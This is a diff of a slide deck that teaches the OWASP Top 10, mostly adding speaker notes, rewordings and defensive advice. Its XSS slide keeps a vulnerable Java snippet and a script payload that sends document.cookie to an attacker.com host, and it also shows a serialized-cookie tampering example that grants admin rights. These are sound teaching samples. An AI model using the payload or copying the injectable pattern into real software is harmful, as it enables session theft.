@@ -2,8 +2,6 @@
 
 Number 1 will surprise you!
 
-Note:
-Fill in which number
 
 ---
 
@@ -39,6 +37,10 @@ over 100,000 real-world applications and APIs.
 
 ---
 
+![Let's start](assets/start.gif)
+
+---
+
 # Insufficient Logging and Monitoring
 Number 10
 
@@ -49,9 +51,10 @@ Number 10
 - Insufficient logging and monitoring |
 - Ineffective incident response |
 
-Note: 
-allows attackers to further attack systems, maintain persistence, pivot to more systems,
-and tamper with data.
+Note:
+- Obviously the cause of insufficient logging is insufficient logging,
+- But ineffective response to incidents included in this point as well
+- Those flaws allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper with data.
 
 +++
 
@@ -59,7 +62,10 @@ and tamper with data.
 
 - All login, access control failures and input validation failures should be logged |
 - Establish effective monitoring and alerting |
-- Establish / adopt incident response and recovery plan |
+- Establish / adapt incident response and recovery plan (Such as [NIST](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)) |
+
+Note:
+NIST -> National Institute of Standards and Technology
 
 ---
 
@@ -84,11 +90,18 @@ serious data loss or server takeover.
     <li class="fragment">If update is not possible, consider using [virtual patch](https://www.owasp.org/index.php/Virtual_Patching_Best_Practices#What_is_a_Virtual_Patch.3F)</li>
 </ul>
 
+Note:
+- Obviously keep your deps up to date
+- Monitor sources like (list em) for updates
+- Get Signed packages from official sources
+- If update not possible, use virtual patching
+
 +++
 
 ## What is virtual patch?
 
-A security policy enforcement layer which prevents the exploitation of a known vulnerability.
+#### A security policy enforcement layer which prevents the exploitation of a known vulnerability.
+
 The virtual patch works since the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. 
 
 ---
@@ -115,6 +128,7 @@ i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
 i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 ```
+@[1-2](Given the cookie)
 @[4-5](Attacker changes the object to give themselves admin privileges)
 
 +++
@@ -124,6 +138,16 @@ i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 The only safe architectural pattern is to not accept serialized
 objects from untrusted sources or to use serialization mediums
 that only permit primitive data types.
+
++++
+
+## How do I fight it?
+
+If not possible then:
+- Monitor deserialization and alert if a user deserializes a lot |
+- Log deserialization exceptions/failures |
+- Put code which deserializes in low privilege environment |
+- Enforce strict type constraints during deserialization before object creation |
 
 ---
 
@@ -141,9 +165,6 @@ Number 7
 
 ### Example:
 
-The application uses untrusted data in the construction of the
-following HTML snippet without validation or escaping
-
 ```java
 (String) page += "<input name='creditcard' type='TEXT'
 value='" + request.getParameter("CC") + "'>";
@@ -152,8 +173,13 @@ value='" + request.getParameter("CC") + "'>";
 'http://www.attacker.com/cgi-bin/cookie.cgi?
 foo='+document.cookie</script>'.
 ```
-@[4-6](The attacker modifies the ‘CC’ parameter in his browser)
 
+@[1-2](The application uses untrusted data in the construction of the
+following HTML snippet without validation or escaping)
+@[4-6](The attacker modifies the ‘CC’ parameter in his browser and executes a script)
+
+Note:
+Double click!
 
 +++
 
@@ -189,11 +215,14 @@ The app server admin console is automatically installed and not removed.
 
 ## How do I fight it?
 
-- A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down |
-- Dev, QA and prod environments should be configured identically (With different credentials obviously) |
+- Create repeatable process for deploying locked down environment |
+- Dev, QA and prod environments should be configured identically |
 - Remove unused dependencies and frameworks | 
 - Update as fast as possible (See Number 9) |
-- Automated verification process |
+- Automated configuration verification process |
+
+Note:
+Ad2 - (With different credentials obviously)
 
 ---
 
@@ -240,9 +269,8 @@ Number 4
 
 ## What's that?
 
-External entities can be used to disclose internal files using the file URI handler,
-internal SMB file shares on unpatched Windows servers, internal port scanning, remote code
-execution, and denial of service attacks.
+The XML standard includes the idea of an external general parsed entity (an external entity). 
+During parsing of the XML document, the parser will expand these links and include the content of the URI in the returned XML document.
 
 +++
 
@@ -263,7 +291,6 @@ The attacker attempts to extract data from the server
 
 ## How do I fight it?
 
-- Developer training is essential to identify and mitigate XXE completely |
 - Disable XML external entity and DTD processing |
 - Validate inputs |
 - Patch or upgrade all the latest XML processors and libraries |
@@ -282,8 +309,10 @@ Number 3
 
 ## What's that?
 
-Many web applications and APIs do not properly protect sensitive data. Sensitive data deserves extra protection such as
-encryption at rest or in transit, as well as special precautions when exchanged with the browser.
+Web applications and APIS don't protect sensitive data.
+
+Note:
+So, what's that? Basically it' when Web applications and APIS don't protect sensitive data by ..
 
 +++
 
@@ -301,7 +330,7 @@ data is automatically decrypted when retrieved, allowing an SQL injection flaw t
     <li class="fragment">Encrypt all data in transit</li>
     <li class="fragment">Ensure up-to-date and strong standard algorithms or ciphers</li>
     <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
-    <li class="fragment">Disable caching for response that contain sensitive data</li>
+    <li class="fragment">Disable caching for responses that contain sensitive data</li>
 </ul>
 
 ---
@@ -313,15 +342,18 @@ Number 2
 
 ## What's that?
 
-Application functions related to authentication and session management are often implemented
-incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit
-other implementation flaws to assume other users’ identities
+Application functions related to authentication and session management implemented
+incorrectly, allowing attackers to:
+* compromise passwords
+* keys
+* session tokens
+* exploit other implementation flaws to assume other users’ identities
 
 +++
 
 ### Example:
 
-Credential stuffing, is a common attack. If an application does not rate limit authentication attempts, 
+Credential stuffing is a common attack. If an application does not rate limit authentication attempts, 
 the application can be used as a password oracle to determine if the credentials are valid
 
 Note:
@@ -331,12 +363,12 @@ Credential stuffing -> the use of lists of known passwords
 
 ## How do I fight it?
 <ul>
-    <li class="fragment">DDo not deploy with any default credentials</li>
-    <li class="fragment">DEnsure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
-    <li class="fragment">DImplement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)</li>
-    <li class="fragment">DWhere possible, implement multi-factor authentication</li>
-    <li class="fragment">DLog authentication failures</li>
-    <li class="fragment">DAlign password length, complexity and rotation policies with [NIST 800-63 B's guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)</li>
+    <li class="fragment">Do not deploy with any default credentials</li>
+    <li class="fragment">Ensure passwords are stored with a strong adaptive algorithm such as [Argon2](https://www.cryptolux.org/index.php/Argon2), [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)</li>
+    <li class="fragment">Implement password checks against [top 10000 worst passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)</li>
+    <li class="fragment">Where possible, implement multi-factor authentication</li>
+    <li class="fragment">Log authentication failures</li>
+    <li class="fragment">Align password length, complexity and rotation policies with [NIST 800-63 B's guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)</li>
 </ul>
 
 Note:
@@ -350,9 +382,8 @@ Number 1
 
 ## What's that?
 
-Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an
-interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into
-executing unintended commands or accessing data without proper authorization.
+Injection occurs when untrusted data is sent to an interpreter as part of a command or query.
+The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
 
 +++
 
@@ -368,4 +399,4 @@ Validate your inputs
 
 ---
 
-#That's all folks!
+# That's all folks!
